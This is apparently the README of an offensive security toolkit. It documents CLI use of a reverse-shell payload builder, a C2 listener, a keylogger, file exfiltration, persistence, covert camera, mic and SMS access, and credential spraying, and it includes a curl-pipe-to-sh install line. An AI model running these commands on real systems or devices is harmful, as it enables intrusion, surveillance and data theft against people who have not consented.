# hkall — Modular Offensive Toolkit

Python 3 stdlib toolkit for Android/Termux + Linux. Authorized security testing only.

## Install
```bash
pkg install -y python git termux-api
git clone https://github.com/rizqiwidi/hkall.git
cd hkall && chmod +x hkall.py
python hkall.py
```
Or: `curl -sL https://github.com/rizqiwidi/hkall/raw/master/install.sh | sh`

## TUI — 29 builtin+plugin modules
```
  [1] Port scanner          [2] Web enumerator       [3] DNS / banner lookup
  [4] Subdomain brute DNS   [5] Reverse shell gen    [6] C2 listener (multi-session)
  [7] Keylogger             [8] Exfil client         [9] Exfil server
 [10] Android payload     [11] Shell payload var  [12] LAN host discoverer
 [13] ARP scan            [14] Wifi audit         [15] Persistence
 [16] Device ops          [17] HTTP static server [18] Web form spray
 [19] Config / profile    [20] History (results)  [21] Exit
  [22] SQLi tester         [23] XSS reflection     [24] CSRF check
 [25] IDOR enumeration    [26] ARP MITM (root)    [27] DNS spoof (root)
 [28] Load test           [29] Orchestrator menu  [30] External tools
```

## CLI one-shot
```bash
python hkall.py --list
python hkall.py -m scan --host 192.168.1.5 --ports 1-1000
python hkall.py -m scan --host x.x.x.x --ports 445,3389 --out scan.txt
python hkall.py -m enum --host http://example.com
python hkall.py -m payload --host 1.2.3.4 --port 8443
python hkall.py -m history
python hkall.py -m cfg
python hkall.py -m c2 --port 4444
python hkall.py -m subd --host example.com
python hkall.py -m lan --cidr 192.168.1.0/24
python hkall.py -m arp --cidr 192.168.1.0/24
python hkall.py -m wifi
python hkall.py -m persist
python hkall.py -m spray --host https://login.example.com
python hkall.py -m sqli --host http://192.168.1.5/sqli.php?x=1
python hkall.py -m xss --host http://192.168.1.5/search.php?q=
python hkall.py -m csrf --host http://192.168.1.5/account/update
python hkall.py -m idor --host http://192.168.1.5/api/user/{{id}}
python hkall.py -m ddos --host http://127.0.0.1:8090/load
python hkall.py -m websec          # orchestrator menu: chain web tests
python hkall.py -m toolbox         # external tools launcher (sqlmap/nmap/ffuf/...)
```

## Module reference

| key | name | what it does |
|-----|------|-------------|
| scan | Port scanner | TCP connect scan, optional banner grab |
| enum | Web enumerator | headers, emails, secrets, form count |
| whois | DNS lookup | A/AAAA records, reverse PTR |
| subd | Subdomain brute | DNS wordlist scan, multi-threaded |
| shell | Shell generator | py/bash/nc/sh/php one-liners |
| c2 | C2 listener | multi-session, XOR stream obfuscation |
| keylog | Keylogger | raw tty capture → `data/keys.log` |
| exfil | Exfil client | send file to `recv` listener |
| recv | Exfil server | receive file from `exfil` client |
| payload | Payload builder | Python reconnect shell (plain or XOR) |
| exe2 | Shell variants | Android termux / Linux one-liners |
| lan | LAN discoverer | probe CIDR 22/80/135/139/443/445/3389 |
| arp | ARP scan | raw socket ARP sweep (root, Linux) |
| wifi | Wifi audit | scaninfo + connectioninfo via termux-api |
| persist | Persistence | boot script + shell hook (opt-in) |
| ops | Device ops | battery, sms, camera, mic, location, vibrate, clipboard |
| serve | HTTP server | static file server on port 8080 |
| spray | Credential spray | wordlist brute-force web login forms |
| cfg | Config profile | set host/port/cidr defaults (persisted) |
| history | History | view sqlite result store `data/rs.db` |
| sqli | SQLi tester | 16 payload classic + time-based blind, status/timing diff |
| xss | XSS reflection | 6 payloads, detects raw reflected vs escaped |
| csrf | CSRF check | SameSite cookie + token presence verdict |
| idor | IDOR enum | object ID sweep, authz check per ID |
| mitm | ARP MITM lab | ARP spoof between two own hosts, auto-restore (root) |
| dnsspoof | DNS spoof lab | fake DNS server for lab domain (root) |
| ddos | Load test | bounded concurrency/duration, req/s + byte stats |
| websec | Orchestrator | menu: chain sqli→xss→csrf→idor against one target |
| toolbox | External tools | launcher for sqlmap/nmap/hydra/ffuf/bettercap/dnschef/tcpdump/mitmproxy/hping3/dnsmasq/dsniff/ab/siege/wrk/goldeneye/macchanger/tshark |

### Toolbox (external tools)

`python hkall.py -m toolbox` — menu kategori → pilih tool → binary belum ada? toolbox tawarkan
`pkg install` (konfirmasi dulu, tidak auto) → wrapper interaktif arg → jalan.
Katalog: `tools.json` (18 tool).

Sudah terpasang di device ini: `tshark`, `mitmdump` (mitmproxy). Sisanya ditawarkan install saat dipilih.
Kalau nggak mau install: semua modul internal (sqli, xss, csrf, idor, mitm, dnsspoof, ddos) jalan tanpa dependency.

| kategori | tools |
|----------|-------|
| web | sqlmap, ffuf, mitmproxy |
| net | bettercap, dnschef, tcpdump, tshark, hping3, dnsmasq, dsniff, macchanger |
| recon | nmap |
| auth | hydra |
| load | ab, siege, wrk, goldeneye |

Tidak tersedia di Termux (ditandai `unavailable`): ettercap. Perlu source/pip: dalfox, xsstrike, feroxbuster.
GUI/cloud (tidak cocok Termux CLI): Burp Suite, XSSHunter, evilginx. Windows-only: responder.

## C2 usage
```bash
python hkall.py -m c2 --port 4444
```
Session commands inside listener:
```
sessions          list connected shells
use S1            select session 1
kill S1           drop session
<cmd>             run on selected session
exit              stop listener
```
**Obfuscation**: set `obfuscate: true` in `config.json`, then build payload with `y`. Client and server XOR stream match.

## Plugins
Drop `.py` into `modules/`:
```python
def mod_mymod():
    print("hello from plugin")
PLUGIN = {"mymod": ("My module", mod_mymod, True)}
```
Plugins auto-loaded, appear in TUI and CLI. Sample: `modules/hello.py`.

## Data / artifacts
- `data/rs.db` — sqlite history (kind, target, ts, data)
- `data/keys.log` — keylogger capture
- `data/payload.py` — built payload
- `data/cam_*.jpg` — camera capture
- `data/mic_*.m4a` — mic recording
- `wordlist.txt` — password wordlist for spray
- `subd.txt` — subdomain wordlist

## Config
Defaults stored in `config.json`. Edit manually or use `cfg` module:
```json
{"host": "1.2.3.4", "port": "4444", "ports": "1-1000", "cidr": "192.168.1.0/24"}
```

## Legal
Authorized testing only. You own the consequences.